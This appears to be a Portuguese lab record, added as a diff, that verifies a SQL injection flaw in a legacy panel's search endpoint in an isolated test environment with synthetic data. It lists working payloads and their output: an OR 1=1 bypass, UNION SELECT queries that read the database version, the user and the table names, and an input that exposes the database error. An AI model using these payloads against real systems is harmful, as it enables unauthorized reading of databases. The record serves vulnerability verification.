@@ -1,0 +1,29 @@
+# Prova de SQL Injection no painel LEGADO (laboratorio isolado, dados sinteticos) - INC-VA-0712
+# Endpoint: GET /historico?busca=...   (consulta montada por concatenacao de string)
+
+## 1. Busca legitima (linha de base)
+payload: Aurora
+linhas retornadas: 20
+
+## 2. Bypass booleano (OR 1=1 com comentario): retorna a tabela inteira
+payload: zzz%' OR '1'='1' -- 
+linhas retornadas: 400
+(a tabela tem no total, por COUNT no banco:)
+400
+
+## 3. UNION para ler metadados do banco (versao e usuario)
+payload: zzz%' UNION SELECT NULL,version(),current_user,NULL,NULL,NULL -- 
+PostgreSQL 14.24 (Ubuntu 14.24-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.3) 11.4.0, 64-bit
+painel_legado
+
+## 4. UNION lendo nomes de tabelas (extracao de esquema)
+payload: zzz%' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public' -- 
+<td>agendamento_bomba</td>
+<td>historico_acessos</td>
+<td>usuarios</td>
+
+## 5. Erro do banco exposto ao usuario (vazamento de detalhe)
+payload: x'
+Erro no banco
+unterminated quoted string
+SQL: SELECT
